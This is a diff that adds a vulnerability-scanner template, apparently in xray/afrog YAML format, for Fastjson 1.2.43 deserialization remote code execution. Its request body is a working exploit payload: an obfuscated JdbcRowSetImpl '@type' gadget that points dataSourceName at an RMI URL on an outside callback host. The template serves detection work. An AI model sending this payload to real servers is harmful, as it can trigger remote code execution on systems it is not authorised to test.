@@ -1,0 +1,28 @@
+id: fastjson-1-2-43-rce
+
+info:
+  name: Fastjson 1.2.43 Deserialization RCE
+  author: zh
+  severity: critical
+  reference:
+    - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
+    - https://github.com/wyzxxz/fastjson_rce_tool
+
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: POST
+      path: /
+      headers:
+        Content-Type: application/json; charset=utf-8
+      body: |
+        {
+           "@type":"LL\u0063\u006f\u006d.sun.rowset.JdbcRowSetImpl;;",
+           "dataSourceName":"rmi://{{reverseURL}}/Exploit",
+           "autoCommit":true
+        }
+    expression: response.status == 200 && reverse.wait(5)
+expression: r0() 
